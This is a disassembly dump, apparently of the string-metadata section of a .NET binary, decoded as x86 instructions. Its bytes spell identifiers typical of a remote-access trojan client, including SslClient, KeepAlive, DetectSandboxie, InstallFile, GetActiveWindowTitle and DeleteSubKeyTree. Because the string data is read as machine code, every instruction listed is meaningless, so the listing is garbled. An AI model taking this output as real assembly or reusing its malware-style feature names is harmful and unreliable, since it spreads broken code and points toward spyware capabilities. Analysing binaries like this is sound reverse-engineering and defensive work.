  407b90:	47                   	inc    %edi
  407b91:	75 69                	jne    0x407bfc
  407b93:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b97:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407b9e:	64 
  407b9f:	53                   	push   %ebx
  407ba0:	79 6e                	jns    0x407c10
  407ba2:	63 3e                	arpl   %edi,(%esi)
  407ba4:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407ba8:	61                   	popa
  407ba9:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bac:	6e                   	outsb  %ds:(%esi),(%dx)
  407bad:	67 46                	addr16 inc %esi
  407baf:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bb6:	73 43                	jae    0x407bfb
  407bb8:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb9:	6e                   	outsb  %ds:(%esi),(%dx)
  407bba:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbb:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bc0:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc5:	61                   	popa
  407bc6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bc9:	6e                   	outsb  %ds:(%esi),(%dx)
  407bca:	67 46                	addr16 inc %esi
  407bcc:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bd3:	65 65 70 41          	gs gs jo 0x407c18
  407bd7:	6c                   	insb   (%dx),%es:(%edi)
  407bd8:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407bdf:	42                   	inc    %edx
  407be0:	61                   	popa
  407be1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407be4:	6e                   	outsb  %ds:(%esi),(%dx)
  407be5:	67 46                	addr16 inc %esi
  407be7:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407bee:	65 61                	gs popa
  407bf0:	64 65 72 53          	fs gs jb 0x407c47
  407bf4:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bfb:	42                   	inc    %edx
  407bfc:	61                   	popa
  407bfd:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c00:	6e                   	outsb  %ds:(%esi),(%dx)
  407c01:	67 46                	addr16 inc %esi
  407c03:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c0a:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c11:	42                   	inc    %edx
  407c12:	61                   	popa
  407c13:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c16:	6e                   	outsb  %ds:(%esi),(%dx)
  407c17:	67 46                	addr16 inc %esi
  407c19:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c20:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c24:	61                   	popa
  407c25:	74 65                	je     0x407c8c
  407c27:	50                   	push   %eax
  407c28:	6f                   	outsl  %ds:(%esi),(%dx)
  407c29:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2a:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c30:	61                   	popa
  407c31:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c34:	6e                   	outsb  %ds:(%esi),(%dx)
  407c35:	67 46                	addr16 inc %esi
  407c37:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c3e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3f:	74 65                	je     0x407ca6
  407c41:	72 76                	jb     0x407cb9
  407c43:	61                   	popa
  407c44:	6c                   	insb   (%dx),%es:(%edi)
  407c45:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c4a:	61                   	popa
  407c4b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c4e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c4f:	67 46                	addr16 inc %esi
  407c51:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c58:	75 66                	jne    0x407cc0
  407c5a:	66 65 72 3e          	data16 gs jb 0x407c9c
  407c5e:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c62:	61                   	popa
  407c63:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c66:	6e                   	outsb  %ds:(%esi),(%dx)
  407c67:	67 46                	addr16 inc %esi
  407c69:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c70:	66 66 73 65          	data16 data16 jae 0x407cd9
  407c74:	74 3e                	je     0x407cb4
  407c76:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c7a:	61                   	popa
  407c7b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c7e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c7f:	67 46                	addr16 inc %esi
  407c81:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c88:	73 6c                	jae    0x407cf6
  407c8a:	43                   	inc    %ebx
  407c8b:	6c                   	insb   (%dx),%es:(%edi)
  407c8c:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c93:	5f                   	pop    %edi
  407c94:	42                   	inc    %edx
  407c95:	61                   	popa
  407c96:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c99:	6e                   	outsb  %ds:(%esi),(%dx)
  407c9a:	67 46                	addr16 inc %esi
  407c9c:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407ca3:	63 70 43             	arpl   %esi,0x43(%eax)
  407ca6:	6c                   	insb   (%dx),%es:(%edi)
  407ca7:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cae:	5f                   	pop    %edi
  407caf:	42                   	inc    %edx
  407cb0:	61                   	popa
  407cb1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cb4:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb5:	67 46                	addr16 inc %esi
  407cb7:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cbe:	6e                   	outsb  %ds:(%esi),(%dx)
  407cbf:	65 72 41             	gs jb  0x407d03
  407cc2:	64 64 4d             	fs fs dec %ebp
  407cc5:	61                   	popa
  407cc6:	70 43                	jo     0x407d0b
  407cc8:	68 69 6c 64 00       	push   $0x646c69
  407ccd:	49                   	dec    %ecx
  407cce:	6e                   	outsb  %ds:(%esi),(%dx)
  407ccf:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd0:	65 72 41             	gs jb  0x407d14
  407cd3:	64 64 41             	fs fs inc %ecx
  407cd6:	72 72                	jb     0x407d4a
  407cd8:	61                   	popa
  407cd9:	79 43                	jns    0x407d1e
  407cdb:	68 69 6c 64 00       	push   $0x646c69
  407ce0:	68 57 6e 64 00       	push   $0x646e57
  407ce5:	53                   	push   %ebx
  407ce6:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ce8:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407cec:	70 65                	jo     0x407d53
  407cee:	6e                   	outsb  %ds:(%esi),(%dx)
  407cef:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cf3:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cfa:	61 
  407cfb:	6c                   	insb   (%dx),%es:(%edi)
  407cfc:	75 65                	jne    0x407d63
  407cfe:	4b                   	dec    %ebx
  407cff:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d06:	6c                   	insb   (%dx),%es:(%edi)
  407d07:	61                   	popa
  407d08:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d0b:	43                   	inc    %ebx
  407d0c:	72 65                	jb     0x407d73
  407d0e:	61                   	popa
  407d0f:	74 65                	je     0x407d76
  407d11:	49                   	dec    %ecx
  407d12:	6e                   	outsb  %ds:(%esi),(%dx)
  407d13:	73 74                	jae    0x407d89
  407d15:	61                   	popa
  407d16:	6e                   	outsb  %ds:(%esi),(%dx)
  407d17:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d1a:	73 65                	jae    0x407d81
  407d1c:	74 5f                	je     0x407d7d
  407d1e:	4d                   	dec    %ebp
  407d1f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d20:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d25:	6c                   	insb   (%dx),%es:(%edi)
  407d26:	65 4d                	gs dec %ebp
  407d28:	6f                   	outsl  %ds:(%esi),(%dx)
  407d29:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d2e:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d35:	64 65 
  407d37:	00 45 6e             	add    %al,0x6e(%ebp)
  407d3a:	74 65                	je     0x407da1
  407d3c:	72 44                	jb     0x407d82
  407d3e:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d42:	4d                   	dec    %ebp
  407d43:	6f                   	outsl  %ds:(%esi),(%dx)
  407d44:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d49:	79 70                	jns    0x407dbb
  407d4b:	74 6f                	je     0x407dbc
  407d4d:	53                   	push   %ebx
  407d4e:	74 72                	je     0x407dc2
  407d50:	65 61                	gs popa
  407d52:	6d                   	insl   (%dx),%es:(%edi)
  407d53:	4d                   	dec    %ebp
  407d54:	6f                   	outsl  %ds:(%esi),(%dx)
  407d55:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d5a:	6d                   	insl   (%dx),%es:(%edi)
  407d5b:	70 72                	jo     0x407dcf
  407d5d:	65 73 73             	gs jae 0x407dd3
  407d60:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d67:	00 43 69             	add    %al,0x69(%ebx)
  407d6a:	70 68                	jo     0x407dd4
  407d6c:	65 72 4d             	gs jb  0x407dbc
  407d6f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d70:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d75:	6c                   	insb   (%dx),%es:(%edi)
  407d76:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d7b:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d80:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d84:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d87:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d8c:	65 74 65             	gs je  0x407df4
  407d8f:	53                   	push   %ebx
  407d90:	75 62                	jne    0x407df4
  407d92:	4b                   	dec    %ebx
  407d93:	65 79 54             	gs jns 0x407dea
  407d96:	72 65                	jb     0x407dfd
  407d98:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d9c:	74 5f                	je     0x407dfd
  407d9e:	4d                   	dec    %ebp
  407d9f:	65 73 73             	gs jae 0x407e15
  407da2:	61                   	popa
  407da3:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407da8:	74 65                	je     0x407e0f
  407daa:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407dae:	6e                   	outsb  %ds:(%esi),(%dx)
  407daf:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407db3:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dba:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dbe:	45                   	inc    %ebp
  407dbf:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc0:	75 6d                	jne    0x407e2f
  407dc2:	65 72 61             	gs jb  0x407e26
  407dc5:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dc9:	49                   	dec    %ecx
  407dca:	44                   	inc    %esp
  407dcb:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dd2:	6c                   	insb   (%dx),%es:(%edi)
  407dd3:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407dd8:	6f                   	outsl  %ds:(%esi),(%dx)
  407dd9:	75 62                	jne    0x407e3d
  407ddb:	6c                   	insb   (%dx),%es:(%edi)
  407ddc:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407de0:	61                   	popa
  407de1:	70 44                	jo     0x407e27
  407de3:	6f                   	outsl  %ds:(%esi),(%dx)
  407de4:	75 62                	jne    0x407e48
  407de6:	6c                   	insb   (%dx),%es:(%edi)
  407de7:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407deb:	74 5f                	je     0x407e4c
  407ded:	48                   	dec    %eax
  407dee:	61                   	popa
  407def:	6e                   	outsb  %ds:(%esi),(%dx)
  407df0:	64 6c                	fs insb (%dx),%es:(%edi)
  407df2:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407df6:	6e                   	outsb  %ds:(%esi),(%dx)
  407df7:	74 69                	je     0x407e62
  407df9:	6d                   	insl   (%dx),%es:(%edi)
  407dfa:	65 46                	gs inc %esi
  407dfc:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e03:	64 6c                	fs insb (%dx),%es:(%edi)
  407e05:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e09:	74 4d                	je     0x407e58
  407e0b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e0c:	64 75 6c             	fs jne 0x407e7b
  407e0f:	65 48                	gs dec %eax
  407e11:	61                   	popa
  407e12:	6e                   	outsb  %ds:(%esi),(%dx)
  407e13:	64 6c                	fs insb (%dx),%es:(%edi)
  407e15:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e19:	6e                   	outsb  %ds:(%esi),(%dx)
  407e1a:	74 69                	je     0x407e85
  407e1c:	6d                   	insl   (%dx),%es:(%edi)
  407e1d:	65 54                	gs push %esp
  407e1f:	79 70                	jns    0x407e91
  407e21:	65 48                	gs dec %eax
  407e23:	61                   	popa
  407e24:	6e                   	outsb  %ds:(%esi),(%dx)
  407e25:	64 6c                	fs insb (%dx),%es:(%edi)
  407e27:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e2b:	74 54                	je     0x407e81
  407e2d:	79 70                	jns    0x407e9f
  407e2f:	65 46                	gs inc %esi
  407e31:	72 6f                	jb     0x407ea2
  407e33:	6d                   	insl   (%dx),%es:(%edi)
  407e34:	48                   	dec    %eax
  407e35:	61                   	popa
  407e36:	6e                   	outsb  %ds:(%esi),(%dx)
  407e37:	64 6c                	fs insb (%dx),%es:(%edi)
  407e39:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e3d:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e44:	65 
  407e45:	00 57 72             	add    %dl,0x72(%edi)
  407e48:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e4f:	6c 
  407e50:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e55:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e5c:	65 74 41             	gs je  0x407ea0
  407e5f:	73 53                	jae    0x407eb4
  407e61:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e68:	6e                   	outsb  %ds:(%esi),(%dx)
  407e69:	73 74                	jae    0x407edf
  407e6b:	61                   	popa
  407e6c:	6c                   	insb   (%dx),%es:(%edi)
  407e6d:	6c                   	insb   (%dx),%es:(%edi)
  407e6e:	46                   	inc    %esi
  407e6f:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e76:	6f 
  407e77:	64 65 46             	fs gs inc %esi
  407e7a:	72 6f                	jb     0x407eeb
  407e7c:	6d                   	insl   (%dx),%es:(%edi)
  407e7d:	46                   	inc    %esi
  407e7e:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e85:	65 
  407e86:	42                   	inc    %edx
  407e87:	79 74                	jns    0x407efd
  407e89:	65 73 54             	gs jae 0x407ee0
  407e8c:	6f                   	outsl  %ds:(%esi),(%dx)
  407e8d:	46                   	inc    %esi
  407e8e:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e95:	6e 
  407e96:	52                   	push   %edx
  407e97:	6f                   	outsl  %ds:(%esi),(%dx)
  407e98:	6c                   	insb   (%dx),%es:(%edi)
  407e99:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407e9d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e9e:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ea0:	77 73                	ja     0x407f15
  407ea2:	42                   	inc    %edx
  407ea3:	75 69                	jne    0x407f0e
  407ea5:	6c                   	insb   (%dx),%es:(%edi)
  407ea6:	74 49                	je     0x407ef1
  407ea8:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea9:	52                   	push   %edx
  407eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  407eab:	6c                   	insb   (%dx),%es:(%edi)
  407eac:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eb0:	74 41                	je     0x407ef3
  407eb2:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eb6:	65 57                	gs push %edi
  407eb8:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ebf:	74 6c                	je     0x407f2d
  407ec1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec5:	74 5f                	je     0x407f26
  407ec7:	4d                   	dec    %ebp
  407ec8:	61                   	popa
  407ec9:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ed0:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ed4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed5:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ed8:	73 4d                	jae    0x407f27
  407eda:	6f                   	outsl  %ds:(%esi),(%dx)
  407edb:	64 75 6c             	fs jne 0x407f4a
  407ede:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ee2:	74 5f                	je     0x407f43
  407ee4:	57                   	push   %edi
  407ee5:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407eec:	79 6c                	jns    0x407f5a
  407eee:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ef2:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef3:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ef6:	73 57                	jae    0x407f4f
  407ef8:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407eff:	79 6c                	jns    0x407f6d
  407f01:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f05:	74 5f                	je     0x407f66
  407f07:	4e                   	dec    %esi
  407f08:	61                   	popa
  407f09:	6d                   	insl   (%dx),%es:(%edi)
  407f0a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f0e:	74 5f                	je     0x407f6f
  407f10:	46                   	inc    %esi
  407f11:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f18:	00 
  407f19:	73 65                	jae    0x407f80
  407f1b:	74 5f                	je     0x407f7c
  407f1d:	46                   	inc    %esi
  407f1e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f25:	00 
  407f26:	47                   	inc    %edi
  407f27:	65 74 54             	gs je  0x407f7e
  407f2a:	65 6d                	gs insl (%dx),%es:(%edi)
  407f2c:	70 46                	jo     0x407f74
  407f2e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f35:	00 
  407f36:	47                   	inc    %edi
  407f37:	65 74 46             	gs je  0x407f80
  407f3a:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f41:	00 
  407f42:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f49:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f4e:	6f                   	outsl  %ds:(%esi),(%dx)
  407f4f:	64 75 6c             	fs jne 0x407fbe
  407f52:	65 4e                	gs dec %esi
  407f54:	61                   	popa
  407f55:	6d                   	insl   (%dx),%es:(%edi)
  407f56:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f5a:	74 5f                	je     0x407fbb
  407f5c:	4d                   	dec    %ebp
  407f5d:	61                   	popa
  407f5e:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f61:	6e                   	outsb  %ds:(%esi),(%dx)
  407f62:	65 4e                	gs dec %esi
  407f64:	61                   	popa
  407f65:	6d                   	insl   (%dx),%es:(%edi)
  407f66:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f6a:	74 5f                	je     0x407fcb
  407f6c:	4f                   	dec    %edi
  407f6d:	53                   	push   %ebx
  407f6e:	46                   	inc    %esi
  407f6f:	75 6c                	jne    0x407fdd
  407f71:	6c                   	insb   (%dx),%es:(%edi)
  407f72:	4e                   	dec    %esi
  407f73:	61                   	popa
  407f74:	6d                   	insl   (%dx),%es:(%edi)
  407f75:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f79:	74 5f                	je     0x407fda
  407f7b:	46                   	inc    %esi
  407f7c:	75 6c                	jne    0x407fea
  407f7e:	6c                   	insb   (%dx),%es:(%edi)
  407f7f:	4e                   	dec    %esi
  407f80:	61                   	popa
  407f81:	6d                   	insl   (%dx),%es:(%edi)
  407f82:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f86:	56                   	push   %esi
  407f87:	61                   	popa
  407f88:	6c                   	insb   (%dx),%es:(%edi)
  407f89:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f90:	6e 
  407f91:	4e                   	dec    %esi
  407f92:	61                   	popa
  407f93:	6d                   	insl   (%dx),%es:(%edi)
  407f94:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f98:	74 5f                	je     0x407ff9
  407f9a:	55                   	push   %ebp
  407f9b:	73 65                	jae    0x408002
  407f9d:	72 4e                	jb     0x407fed
  407f9f:	61                   	popa
  407fa0:	6d                   	insl   (%dx),%es:(%edi)
  407fa1:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fa6:	65 72 4e             	gs jb  0x407ff7
  407fa9:	61                   	popa
  407faa:	6d                   	insl   (%dx),%es:(%edi)
  407fab:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407faf:	74 4e                	je     0x407fff
  407fb1:	61                   	popa
  407fb2:	6d                   	insl   (%dx),%es:(%edi)
  407fb3:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fb7:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fbb:	6f                   	outsl  %ds:(%esi),(%dx)
  407fbc:	73 74                	jae    0x408032
  407fbe:	4e                   	dec    %esi
  407fbf:	61                   	popa
  407fc0:	6d                   	insl   (%dx),%es:(%edi)
  407fc1:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc5:	6d                   	insl   (%dx),%es:(%edi)
  407fc6:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fcb:	65 54                	gs push %esp
  407fcd:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fd4:	5f                   	pop    %edi
  407fd5:	4c                   	dec    %esp
  407fd6:	61                   	popa
  407fd7:	73 74                	jae    0x40804d
  407fd9:	57                   	push   %edi
  407fda:	72 69                	jb     0x408045
  407fdc:	74 65                	je     0x408043
  407fde:	54                   	push   %esp
  407fdf:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fe6:	6e                   	outsb  %ds:(%esi),(%dx)
  407fe7:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407fee:	54                   	push   %esp
  407fef:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ff6:	74 65                	je     0x40805d
  407ff8:	4c                   	dec    %esp
  407ff9:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408000:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408003:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408007:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  40800e:	6d                   	insl   (%dx),%es:(%edi)
  40800f:	65 54                	gs push %esp
  408011:	79 70                	jns    0x408083
  408013:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408017:	74 5f                	je     0x408078
  408019:	56                   	push   %esi
  40801a:	61                   	popa
  40801b:	6c                   	insb   (%dx),%es:(%edi)
  40801c:	75 65                	jne    0x408083
  40801e:	54                   	push   %esp
  40801f:	79 70                	jns    0x408091
  408021:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408025:	6c                   	insb   (%dx),%es:(%edi)
  408026:	75 65                	jne    0x40808d
  408028:	54                   	push   %esp
  408029:	79 70                	jns    0x40809b
  40802b:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  40802f:	67 50                	addr16 push %eax
  408031:	61                   	popa
  408032:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408035:	79 70                	jns    0x4080a7
  408037:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40803b:	6f                   	outsl  %ds:(%esi),(%dx)
  40803c:	74 6f                	je     0x4080ad
  40803e:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408041:	54                   	push   %esp
  408042:	79 70                	jns    0x4080b4
  408044:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408048:	74 54                	je     0x40809e
  40804a:	79 70                	jns    0x4080bc
  40804c:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408050:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408053:	74 54                	je     0x4080a9
  408055:	79 70                	jns    0x4080c7
  408057:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40805b:	6c                   	insb   (%dx),%es:(%edi)
  40805c:	65 53                	gs push %ebx
  40805e:	68 61 72 65 00       	push   $0x657261
  408063:	53                   	push   %ebx
  408064:	79 73                	jns    0x4080d9
  408066:	74 65                	je     0x4080cd
  408068:	6d                   	insl   (%dx),%es:(%edi)
  408069:	2e 43                	cs inc %ebx
  40806b:	6f                   	outsl  %ds:(%esi),(%dx)
  40806c:	72 65                	jb     0x4080d3
  40806e:	00 53 65             	add    %dl,0x65(%ebx)
  408071:	72 76                	jb     0x4080e9
  408073:	65 72 73             	gs jb  0x4080e9
  408076:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  40807d:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  408081:	6f                   	outsl  %ds:(%esi),(%dx)
  408082:	73 65                	jae    0x4080e9
  408084:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408088:	70 6f                	jo     0x4080f9
  40808a:	73 65                	jae    0x4080f1
  40808c:	00 50 61             	add    %dl,0x61(%eax)
  40808f:	72 73                	jb     0x408104
  408091:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408095:	72 52                	jb     0x4080e9
  408097:	65 76 65             	gs jbe 0x4080ff
  40809a:	72 73                	jb     0x40810f
  40809c:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080a0:	30 39                	xor    %bh,(%ecx)
  4080a2:	43                   	inc    %ebx
  4080a3:	65 72 74             	gs jb  0x40811a
  4080a6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080ad:	00 56 61             	add    %dl,0x61(%esi)
  4080b0:	6c                   	insb   (%dx),%es:(%edi)
  4080b1:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080b8:	72 
  4080b9:	76 65                	jbe    0x408120
  4080bb:	72 43                	jb     0x408100
  4080bd:	65 72 74             	gs jb  0x408134
  4080c0:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080c7:	00 63 65             	add    %ah,0x65(%ebx)
  4080ca:	72 74                	jb     0x408140
  4080cc:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d3:	00 43 72             	add    %al,0x72(%ebx)
  4080d6:	65 61                	gs popa
  4080d8:	74 65                	je     0x40813f
  4080da:	00 53 65             	add    %dl,0x65(%ebx)
  4080dd:	74 54                	je     0x408133
  4080df:	68 72 65 61 64       	push   $0x64616572
  4080e4:	45                   	inc    %ebp
  4080e5:	78 65                	js     0x40814c
  4080e7:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080ea:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080f1:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080f6:	65 74 65             	gs je  0x40815e
  4080f9:	00 43 61             	add    %al,0x61(%ebx)
  4080fc:	6c                   	insb   (%dx),%es:(%edi)
  4080fd:	6c                   	insb   (%dx),%es:(%edi)
